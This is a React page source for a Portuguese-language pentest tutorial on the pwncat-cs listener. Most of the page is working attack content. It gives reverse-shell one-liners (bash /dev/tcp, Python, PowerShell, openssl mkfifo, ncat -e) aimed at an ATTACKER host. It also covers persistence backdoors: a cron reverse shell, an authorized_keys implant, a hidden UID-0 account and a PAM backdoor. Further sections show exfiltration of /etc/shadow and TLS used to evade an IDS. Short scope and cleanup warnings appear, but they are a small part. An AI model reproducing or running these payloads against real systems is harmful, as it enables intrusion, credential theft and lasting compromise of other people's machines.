import { PageContainer } from "@/components/layout/PageContainer";
import { AlertBox } from "@/components/ui/AlertBox";
import { CodeBlock } from "@/components/ui/CodeBlock";
import { CommandTable } from "@/components/ui/CommandTable";
import { PracticeBox } from "@/components/ui/PracticeBox";
import { Terminal } from "@/components/ui/Terminal";

export default function Pwncat() {
  return (
    <PageContainer
      title="pwncat-cs — netcat com superpoderes para pentest"
      subtitle="Listener inteligente: auto-upgrade de shell para PTY, tab completion no alvo, file transfer, persistência e enumeração — tudo em uma sessão única."
      difficulty="intermediario"
      timeToRead="17 min"
    >
      <h2>Por que abandonar o netcat puro</h2>
      <p>
        <code>nc -lvnp 4444</code> resolve, mas a sessão é uma porcaria: sem PTY, sem histórico,
        Ctrl+C mata o callback, sem tab completion, sem upload/download. <strong>pwncat-cs</strong>{" "}
        (fork moderno mantido por Caleb Stewart) substitui o netcat para receber reverse shells,
        e ainda dá <em>upgrade automático</em> da shell, persistência via 7+ técnicas, e um
        terminal interativo robusto que sobrevive a desconexões.
      </p>

      <AlertBox type="info" title="pwncat ≠ pwncat-cs">
        Existem dois projetos. O original <code>cytopia/pwncat</code> é um nc enxuto em Python.{" "}
        <strong>caleb-stewart/pwncat-cs</strong> é o fork "command and control" — bem mais
        poderoso. Ao instalar, garanta que é <code>pwncat-cs</code>.
      </AlertBox>

      <h2>Instalação</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "via pipx — isolado e sempre na última versão",
            cmd: "pipx install pwncat-cs",
            out: `  installed package pwncat-cs 0.5.4, installed using Python 3.12.7
  These apps are now globally available:
    - pwncat-cs`,
            outType: "success",
          },
          {
            comment: "alternativa: apt no Kali (versão mais antiga)",
            cmd: "sudo apt install -y python3-pwncat-cs",
            out: "(disponível em repos recentes do Kali)",
            outType: "muted",
          },
          {
            cmd: "pwncat-cs --version",
            out: "0.5.4",
            outType: "info",
          },
          {
            cmd: "pwncat-cs --help | head -25",
            out: `usage: pwncat-cs [-h] [--config CONFIG] [--identity IDENTITY] [--listen]
                 [--port PORT] [--platform PLATFORM] [--ssl] [--verbose]
                 [connection_string]

positional arguments:
  connection_string     Connection string

options:
  -h, --help            show this help message and exit
  --listen, -l          Listen for an incoming connection
  --port PORT, -p PORT  Port to listen on or connect to
  --platform PLATFORM, -m PLATFORM
                        Platform of the target (linux/windows)
  --ssl                 Use SSL for connection
  --identity IDENTITY, -i IDENTITY
                        SSH private key`,
            outType: "default",
          },
        ]}
      />

      <h2>Subindo o listener</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "listener Linux na 4444 — pwncat já reconhece a plataforma",
            cmd: "pwncat-cs -lp 4444",
            out: `[18:42:01] Welcome to pwncat 🐈!
[18:42:01] received connection from 10.10.10.42:51234
[18:42:01] 10.10.10.42:51234: registered new host w/ db
[18:42:01] 10.10.10.42:51234: shell upgraded to /usr/bin/bash
[18:42:01] 10.10.10.42:51234: pty allocated via python3
[18:42:01] 10.10.10.42:51234: enumerating system facts
(local) pwncat$ `,
            outType: "success",
          },
          {
            comment: "Windows alvo — força a plataforma certa",
            cmd: "pwncat-cs -lp 4444 -m windows",
            out: `[18:50:22] Welcome to pwncat 🐈!
[18:50:30] received connection from 10.10.10.50:60123
[18:50:30] 10.10.10.50:60123: shell upgraded to powershell.exe
(local) pwncat$ `,
            outType: "info",
          },
        ]}
      />

      <h2>Reverse shell no alvo (one-liners)</h2>
      <CodeBlock
        language="bash"
        title="payloads que se conectam ao listener"
        code={`# Bash puro (Linux)
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'

# Bash via /dev/tcp (igual mas portável)
exec bash -c 'exec bash -i &>/dev/tcp/ATTACKER/4444 <&1'

# Python — funciona em quase todo Linux
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("ATTACKER",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'

# PowerShell (Windows)
powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('ATTACKER',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+'PS '+(pwd).Path+'> ';$sbt=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()}"`}
      />

      <h2>O modo prompt — comando local vs comando remoto</h2>
      <p>
        Quando o callback chega, você está no <strong>prompt local</strong> do pwncat (
        <code>(local) pwncat$</code>). Daqui você dá comandos do pwncat (upload, download,
        persist, enum). Para entrar na shell do alvo, digite <code>back</code> ou <code>C-d</code>.
        Para voltar do alvo ao prompt local, aperte <code>~C</code> (Ctrl+~ depois Shift+C).
      </p>

      <CommandTable
        title="Comandos essenciais do prompt local pwncat"
        variations={[
          { cmd: "back / Ctrl+D", desc: "Vai para a shell remota interativa do alvo.", output: "Você cai num bash com PTY de verdade." },
          { cmd: "~C (na shell remota)", desc: "Volta ao prompt local pwncat sem matar a sessão.", output: "Atalho que substitui o famoso Ctrl+Z + stty raw." },
          { cmd: "help", desc: "Lista todos os comandos disponíveis.", output: "use, upload, download, persist, enum, ..." },
          { cmd: "use enumerate", desc: "Carrega módulo de enumeração local.", output: "Coleta facts (kernel, suid, services, users)." },
          { cmd: "run enumerate -t writable_path", desc: "Roda enumeração específica.", output: "/tmp\\n/var/tmp\\n/dev/shm" },
          { cmd: "use persist.gather", desc: "Lista todos os métodos de persistência.", output: "authorized_keys, cron, systemd, .bashrc, ssh-agent..." },
          { cmd: "run persist.authorized_keys", desc: "Instala chave pública do operador no ~/.ssh/authorized_keys.", output: "[+] persisted via ~/.ssh/authorized_keys" },
          { cmd: "upload exploit.elf /tmp/x", desc: "Sobe arquivo do Kali pro alvo.", output: "(barra de progresso, hash MD5 ao final)" },
          { cmd: "download /etc/shadow ./loot/shadow", desc: "Puxa arquivo do alvo.", output: "(barra de progresso)" },
          { cmd: "sessions", desc: "Lista sessões ativas (multi-target).", output: "0  10.10.10.42  linux  bash  active" },
          { cmd: "session 0", desc: "Pula entre sessões.", output: "Switch instantâneo." },
          { cmd: "exit", desc: "Sai do pwncat (sem matar reverse shell se persistido).", output: "Pergunta confirmação." },
        ]}
      />

      <h2>Auto-upgrade de PTY: por que é mágico</h2>
      <p>
        Reverse shell crua não tem PTY: <code>vim</code> trava, <code>sudo</code> reclama,
        Ctrl+C mata sessão. Manualmente, você faria a dança{" "}
        <code>python -c 'import pty; pty.spawn("/bin/bash")'</code> + <code>stty raw -echo</code>{" "}
        + <code>export TERM=xterm</code>. O pwncat detecta a melhor opção (python3 → python →
        script → expect) e faz tudo automaticamente.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "(local) pwncat$ back",
            out: `(remote) www-data@target:/var/www$ `,
            outType: "success",
          },
          {
            cmd: "(remote) sudo -l",
            out: `[sudo] password for www-data: 
Matching Defaults entries for www-data on target:
    env_reset, mail_badpass

User www-data may run the following commands on target:
    (root) NOPASSWD: /usr/bin/find`,
            outType: "warning",
          },
          {
            cmd: "(remote) vim /etc/passwd",
            out: "(abre vim com cores e tudo, sem travar)",
            outType: "info",
          },
        ]}
      />

      <h2>Transferência de arquivos sem stress</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "subir LinPEAS para o alvo",
            cmd: "(local) pwncat$ upload /opt/peass/linpeas.sh /tmp/.lp.sh",
            out: `[+] uploading /opt/peass/linpeas.sh
   linpeas.sh ━━━━━━━━━━━━━━━━━━━━━━ 875.4/875.4 KB 4.2 MB/s 0:00:00
[+] uploaded /opt/peass/linpeas.sh → /tmp/.lp.sh
[+] md5: 5f3a... matches local`,
            outType: "success",
          },
          {
            cmd: "(local) pwncat$ download /etc/shadow ~/loot/target/shadow",
            out: `[+] downloading /etc/shadow → /home/wallyson/loot/target/shadow
[+] downloaded 1.2 KB`,
            outType: "info",
          },
          {
            comment: "puxar diretório inteiro recursivamente — usa tar+stream",
            cmd: "(local) pwncat$ download /var/www/html/uploads ~/loot/target/uploads",
            out: `[+] downloading directory /var/www/html/uploads
[+] tarballing 142 files... 18.4 MB transferred`,
            outType: "default",
          },
        ]}
      />

      <h2>Persistência integrada</h2>
      <p>
        Pwncat traz módulos prontos de persistência. Cada um instala backdoor sutil e te dá
        forma fácil de reentrar — em alguns casos, automaticamente reconectando se o callback
        cair.
      </p>

      <CommandTable
        title="Métodos de persistência (Linux)"
        variations={[
          {
            cmd: "persist.authorized_keys",
            desc: "Anexa sua chave pública em ~/.ssh/authorized_keys do usuário atual.",
            output: "Reentra com ssh -i ~/.ssh/id_pwncat user@target.",
          },
          {
            cmd: "persist.cron",
            desc: "Cria entrada no crontab que dispara reverse shell a cada N minutos.",
            output: "*/5 * * * * bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'",
          },
          {
            cmd: "persist.systemd",
            desc: "Cria service unit em ~/.config/systemd/user/ ou /etc/systemd/system/.",
            output: "Restart=always — sobrevive a reboot.",
          },
          {
            cmd: "persist.bashrc",
            desc: "Anexa payload no ~/.bashrc do usuário (dispara em todo login).",
            output: "Cuidado: também roda quando o usuário legítimo abrir shell.",
          },
          {
            cmd: "persist.sshd_backdoor",
            desc: "Trickier: substitui PAM ou recompila libnss para 'master password'.",
            output: "Só rode em lab — quebra logging.",
          },
          {
            cmd: "persist.passwd",
            desc: "Adiciona usuário UID 0 oculto via /etc/passwd e /etc/shadow.",
            output: "Persistência clássica nível root.",
          },
        ]}
      />

      <Terminal
        path="~"
        lines={[
          {
            cmd: "(local) pwncat$ run persist.authorized_keys --backdoor-key ~/.ssh/id_pwncat.pub",
            out: `[+] persisted via authorized_keys
[+] reconnect with: ssh -i ~/.ssh/id_pwncat www-data@10.10.10.42`,
            outType: "success",
          },
          {
            cmd: "(local) pwncat$ persist list",
            out: `Active persistence modules:
  - authorized_keys (user: www-data)
  - cron (user: www-data)`,
            outType: "info",
          },
          {
            cmd: "(local) pwncat$ persist remove authorized_keys",
            out: "[+] removed authorized_keys persistence",
            outType: "muted",
          },
        ]}
      />

      <h2>Enumeração automática</h2>
      <p>
        Ao receber a sessão, pwncat coleta facts em background. <code>run enumerate</code> sem
        argumentos despeja TUDO (kernel, hostname, network, suid, capabilities, services). Para
        recortar, use filtros.
      </p>

      <Terminal
        path="~"
        lines={[
          {
            cmd: "(local) pwncat$ run enumerate -t suid",
            out: `┌─ SUID Binaries ─────────────────────────────────────┐
│ /usr/bin/passwd                                     │
│ /usr/bin/sudo                                       │
│ /usr/bin/find          ⚠ EXPLOITABLE via gtfobins   │
│ /usr/bin/pkexec                                     │
│ /usr/bin/su                                         │
│ /usr/bin/mount                                      │
│ /opt/scripts/backup.sh ⚠ writable + suid root!      │
└─────────────────────────────────────────────────────┘`,
            outType: "warning",
          },
          {
            cmd: "(local) pwncat$ run enumerate -t writable_path",
            out: `[+] /home/www-data
[+] /tmp
[+] /var/tmp
[+] /dev/shm
[+] /var/www/html/uploads (group writable, no_exec missing!)`,
            outType: "info",
          },
          {
            cmd: "(local) pwncat$ run enumerate -t kernel_version",
            out: `Linux target 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
[!] CVE-2022-0847 (DirtyPipe) potencialmente aplicável`,
            outType: "warning",
          },
        ]}
      />

      <h2>Comparação direta com netcat puro</h2>
      <CommandTable
        title="netcat vs pwncat-cs"
        variations={[
          { cmd: "PTY automático", desc: "nc: não. pwncat: sim, detecta python/script/expect.", output: "Sem dança manual de stty raw." },
          { cmd: "Ctrl+C seguro", desc: "nc: mata o listener. pwncat: vai pro processo remoto.", output: "Sessão sobrevive." },
          { cmd: "Tab completion remota", desc: "nc: não. pwncat: usa readline injetando no PTY.", output: "Auto-completa /etc/[TAB]." },
          { cmd: "Upload/download", desc: "nc: precisa de outra sessão e b64. pwncat: comando nativo.", output: "upload local.bin /tmp/x" },
          { cmd: "Multi-target", desc: "nc: 1 sessão = 1 listener. pwncat: gerencia N alvos.", output: "Use sessions / session N." },
          { cmd: "Persistência", desc: "nc: zero. pwncat: 7+ módulos.", output: "Um comando = backdoor instalado." },
          { cmd: "Histórico/log da sessão", desc: "nc: nada. pwncat: SQLite com facts e comandos.", output: "Reabre a sessão semanas depois." },
          { cmd: "Footprint no alvo", desc: "nc: zero (só shell). pwncat: zero (todo overhead é local).", output: "Empata em stealth." },
        ]}
      />

      <h2>Bind shell e SSL</h2>
      <Terminal
        path="~"
        lines={[
          {
            comment: "alvo escutando, você conecta (bind shell ao invés de reverse)",
            cmd: "pwncat-cs alvo.tld:4444",
            out: `[+] connecting to alvo.tld:4444
[+] connected
[+] shell upgraded to /bin/bash`,
            outType: "info",
          },
          {
            comment: "TLS para evadir IDS sniffer (alvo manda openssl s_client)",
            cmd: "pwncat-cs -lp 4444 --ssl --cert ~/.pki/red.pem",
            out: `[+] listening for incoming connection on 0.0.0.0:4444 (SSL)
[+] received connection from 10.10.10.42:55012`,
            outType: "success",
          },
        ]}
      />

      <CodeBlock
        language="bash"
        title="payload do alvo: reverse SSL"
        code={`# Alvo Linux com openssl
mkfifo /tmp/p; cat /tmp/p | /bin/bash 2>&1 | openssl s_client -quiet -connect ATTACKER:4444 > /tmp/p

# Alvo Windows com powershell + ncat
ncat --ssl ATTACKER 4444 -e cmd.exe`}
      />

      <PracticeBox
        title="Receba reverse shell + upgrade PTY + persist em 90 segundos"
        goal="Subir listener, capturar callback de teste local, instalar persistência via authorized_keys e validar reentrada via SSH limpo."
        steps={[
          "Em uma aba: pwncat-cs -lp 4444",
          "Em outra aba: dispare reverse shell para 127.0.0.1:4444.",
          "No prompt local pwncat, gere chave SSH e instale via persist.authorized_keys.",
          "Abra terceira aba: ssh com a chave para confirmar reentrada.",
        ]}
        command={`# Aba 1
pwncat-cs -lp 4444

# Aba 2 (simula alvo)
bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'

# Volta na aba 1, no prompt (local) pwncat$:
ssh-keygen -t ed25519 -f ~/.ssh/id_pwncat -N ""
run persist.authorized_keys --backdoor-key ~/.ssh/id_pwncat.pub

# Aba 3 (testa reentrada limpa)
ssh -i ~/.ssh/id_pwncat $USER@127.0.0.1 id`}
        expected={`uid=1000(wallyson) gid=1000(wallyson) groups=1000(wallyson),27(sudo)`}
        verify="Se o ssh -i deu o id sem pedir senha, sua persistência está funcionando. Em alvo real, troque 127.0.0.1 pelo IP do C2 e use chave dedicada por engagement."
      />

      <AlertBox type="danger" title="Persistência gera evidência forense">
        Cada chave em <code>authorized_keys</code>, cron job ou service systemd é prova clara
        de comprometimento. Em pentest com escopo definido, sempre remova com{" "}
        <code>persist remove all</code> antes de fechar o engagement, e documente o que foi
        instalado/removido no relatório.
      </AlertBox>

      <AlertBox type="info" title="Combo com Chisel">
        Pegou shell em alvo atrás de NAT? Suba pwncat-cs no seu host com IP público + Chisel
        para fazer port-forward reverso. Resultado: callback do alvo isolado chega no seu Kali
        local sem expor o C2 inteiro.
      </AlertBox>
    </PageContainer>
  );
}
